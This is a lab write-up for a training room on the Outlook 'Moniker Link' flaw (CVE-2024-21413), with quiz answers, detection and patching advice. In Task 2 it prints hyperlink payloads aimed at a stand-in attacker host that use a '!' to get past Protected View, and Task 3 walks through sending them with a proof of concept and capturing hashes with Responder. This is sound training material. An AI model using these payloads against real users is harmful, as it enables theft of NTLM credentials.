# Moniker Link (CVE-2024-21413)

## [Task 1] Introduction

This room is used to serve as an introduction to exploitation; what better way to get introduced to exploiting things than by exploiting a vulnerability yourself?

On February 13, 2024, Microsoft announced a remote code execution (RCE) and credential leak vulnerability in Outlook and assigned it as CVE-2024-21413, colloquially known as "Moniker Link." This is courtesy of Haifei Li of CHeck Point Research.

This bypasses Outlook's security mechanisms since it doesn't know how to handle Moniker Links very well. Attackers can abuse this by sending malicious Moniker Links to a victim, resulting in Outlook sending off the user's NTLM credentials to the attacker once the hyperlink is clicked.

According to Microsoft, here's what we know about the vulnerability:
- It was published on 2/13/2024.
- It allows for RCE and credential leaking.
- It is a Critical vulnerability.
- It has an attack complexity of Low, meaning that it's not too difficult to perform.
- It has been scored a 9.8 on the Common Vulnerability Scoring System, indicating it is a critical vulnerability.
- It affects Microsoft Office LTSC 2021 (19.0.0 and onward), Microsoft 365 Apps for Enterprise and Office 2019 (16.0.1 and onward), and Microsoft Office 2016 (16.0.0 to 16.0.5435.1001).

You can follow along by launching the attached VM and the AttackBox.

**[Task 1, Question 1] What "Severity" rating has the CVE been assigned?** - Critical

## [Task 2] Moniker Link (CVE-2024-21413)

Outlook renders emails as HTML, and Outlook can parse hyperlinks as HTTP or HTTPS. It can also open URLs specifying applications known as Moniker Links (e.g. `skype:` and `file://`). Outlook prompts for a security warning whenever the application is triggered to open. This is a result of Outlook's "Protected View," which opens emails containing attachments, hyperlinks, and similar content in read-only mode. This blocks macros, particularly those from outside an organization.

We can use the `file://` Moniker Link in the hyperlink to tell Outlook to try and access a file, such as a file on a network share (e.g. `<a href="file://(ATTACKER_IP)/test>Click Me</a>`). This uses the Server Message Block (SMB) protocol, which uses local credentials for authentication. However, Outlook typically blocks this.

We can modify the hyperlink with `!` to get around this, e.g. `<a href="file://ATTACKER_IP/test!exploit>Click Me</a>`. We can provide a Moniker Link for the attack. The share does not need to exist on the remote device; an authentication attempt happens regardless, which results in the victim's Windows netNTLMv2 hash being sent off to the attacker.

RCE is possible because Moniker Links use the Component Object Model (COM) on Windows, but this aspect is outside the scope of the room. There's no publicly-released proof of concept (as of the time of the room's writing) for achieving RCE in this vulnerability.

**[Task 2, Question 1] What Moniker Link type do we use in the hyperlink?** - `file://`

**[Task 2, Question 2] WHat is the special character used to bypass Outlook's "Protected View"?** - `!`

## [Task 3] Exploitation

In this task we will email the Moniker Link to the victim. The victim will attempt to load a file from our machine, and thus their hash will get captured. A PoC is available on GitHub for this.

This proof-of-concept
- Takes an attacker and victim email. You'd need to use your own SMTP server, but this is already set up in the room.
- You need the password to authenticate. The password for `attacker@monikerlink.thm` is `attacker`.
- You need the email content (`html_content`), which contains the Moniker Link as an HTML hyperlink.
- Then you fill in the subject/from/to fields in the email.
- Then we send the email to the mail server.

We can use Responder to create an SMB listener on the attacking machine. From the AttackBox, you would use the interface `-I ens5` (this will differ if you're on a separate machine). You can also do this with Impacket.

We start by opening the CVE-2024-21413 machine. THen we open Outlook by clicking the shortcut on the Desktop, and then click "I don't want to sign in or create an account" on the popup. We dismiss the second popup by clicking the "X" at the top-right of the popup, and then we see the Outlook interface. The victim mailbox has already been setup.

Once Outlook is set up, we can copy and paste the contents of the PoC into the AttackBox. We create a file with `nano exploit.py`, and then paste the code in. You may need to use the slide-out tray in the split-screen view, in the middle of the screen. See GIFs in the room for more details.

We need to modify the POC:
- Modify line #12 in the POC to reflect the IP address of the AttackBox
- Replace the MAILSERVER placeholder in line #31 with the machine's IP.

Then run the exploit. Enter `attacker` as the email password, and then the script will attempt to send the exploit email. If authentication fails, you may need to adjust values in `exploit.py`. In the vulnerable machine, you should have gotten an email with the poisoned link. Clicking the hyperlink in the email should send the netNTLMv2 hash over to Responder in the AttackBox.

**[Task 3, Question 1] What is the name of the application that we use on the AttackBox to capture the user's hash?** - Responder

**[Task 3, Question 2] What type of hash is captured once the hyperlink in the email has been clicked?** - netNTLMv2

## [Task 4] Detection

To detect this, you should be focusing on emails that contain the `file:\\` Moniker Link. This can be done with a Yara rule, and you should be able to see the SMB request from the victim to the attacker in Wireshark packet captures. You should even be able to see the truncated netNTLMv2 hash!

## [Task 5] Remediation

Microsoft has patches to resolve this vulnerability back in the February 2024 Patch Tuesday release. You should update Office products via Windows Update or the Microsoft Update Catalog online. Additionally, users should be reminded of the following good security practices regarding email:
- Don't click random links from unsolicited emails
- Preview links before clicking them
- Forward suspicious emails to the organization's cybersecurity department

You cannot reconfigure Outlook to prevent this attack, and prohibiting the use of the SMB protocol in its entirety can cause damage, since that's how you access network shares in general. Depending on the organization, however, you might be able to work something out in the firewall.

## [Task 6] Conclusion

This is an interesting little vulnerability to whet one's appetite for the upcoming exploitation section. This is a vulnerability that can be used to do some serious damage, and the fact that it is easy to exploit and can be exploited against a wide suite of products just makes it that more interesting as a case study. Not only that, but it serves as a reminder to keep products up-to-date -- in fact, that's really about all you can do here, since Outlook can't be reconfigured to prevent this attack without just updating it.

(Note: The Metasploit rooms are also a part of the Junior Pentester Path, so notes for them will be continued there. Will link to them later.)
